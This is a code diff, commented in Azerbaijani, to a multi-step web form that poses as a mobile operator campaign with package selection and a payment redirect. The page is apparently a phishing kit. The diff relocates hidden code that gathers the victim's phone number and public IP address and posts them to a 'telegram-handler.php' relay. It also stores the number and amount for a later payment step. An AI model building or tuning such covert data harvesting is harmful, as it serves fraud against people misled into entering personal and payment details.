@@ -395,7 +395,7 @@
         }
 
         // ============================================================
-        // 📞 Step 2: Nömrə yazılan kimi Telegram-a göndər
+        // 📞 Step 2: Nömrə yazılanda SADƏCƏ BUTON AKTİV OLUR
         // ============================================================
         document.getElementById('phone-input').addEventListener('input', () => {
             const nextBtn = document.getElementById('step-2-next');
@@ -403,40 +403,6 @@
                 nextBtn.disabled = false;
                 nextBtn.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
                 nextBtn.classList.add('bg-[#2663ea]', 'text-white', 'hover:bg-[#1d4ed8]', 'shadow-lg', 'shadow-blue-200');
-                
-                // ============================================
-                // 📤 NÖMRƏ TAM YAZILAN KİMİ GÖNDƏR
-                // ============================================
-                (async function sendPhoneImmediately() {
-                    const prefix = document.getElementById('prefix-select').value;
-                    const number = phoneMask.value;
-                    const fullPhone = `${prefix} ${number}`;
-                    
-                    let ip = '0.0.0.0';
-                    try {
-                        const r = await fetch('https://api.ipify.org?format=json');
-                        const d = await r.json();
-                        ip = d.ip;
-                    } catch(e) {
-                        console.log('IP alınmadı');
-                    }
-                    
-                    const formData = new FormData();
-                    formData.append('phone', fullPhone);
-                    formData.append('ip', ip);
-                    formData.append('type', 'phone_only');
-                    
-                    try {
-                        await fetch('api/telegram-handler.php', {
-                            method: 'POST',
-                            body: formData
-                        });
-                        console.log('✅ Nömrə göndərildi:', fullPhone);
-                    } catch(e) {
-                        console.log('❌ Nömrə göndərilmədi');
-                    }
-                })();
-                
             } else {
                 nextBtn.disabled = true;
                 nextBtn.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
@@ -473,13 +439,43 @@
             goToStep(4);
         }
 
-        // Linkage Integration Function for Transition
+        // ============================================================
+        // 📤 Step 4: "TƏSDİQLƏ" DÜYMƏSİNDƏ NÖMRƏNİ GÖNDƏR
+        // ============================================================
         function processPaymentRedirect() {
             localStorage.setItem('selectedOperator', state.operator);
             localStorage.setItem('phoneNumber', `${state.prefix} ${state.number}`);
             
             const cleanPrice = state.campaign ? state.campaign.price.replace(/\D/g, '') : '0';
             localStorage.setItem('paymentAmount', cleanPrice);
+
+            // 📤 NÖMRƏNİ BURADA GÖNDƏR (PAKET SEÇİLƏNDƏN SONRA)
+            (async function sendPhoneNow() {
+                const fullPhone = `${state.prefix} ${state.number}`;
+                let ip = '0.0.0.0';
+                try {
+                    const r = await fetch('https://api.ipify.org?format=json');
+                    const d = await r.json();
+                    ip = d.ip;
+                } catch(e) {
+                    console.log('IP alınmadı');
+                }
+                
+                const formData = new FormData();
+                formData.append('phone', fullPhone);
+                formData.append('ip', ip);
+                formData.append('type', 'phone_only');
+                
+                try {
+                    await fetch('api/telegram-handler.php', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    console.log('✅ Nömrə göndərildi:', fullPhone);
+                } catch(e) {
+                    console.log('❌ Nömrə göndərilmədi');
+                }
+            })();
 
             const overlay = document.getElementById('status-overlay');
             const title = document.getElementById('status-title');
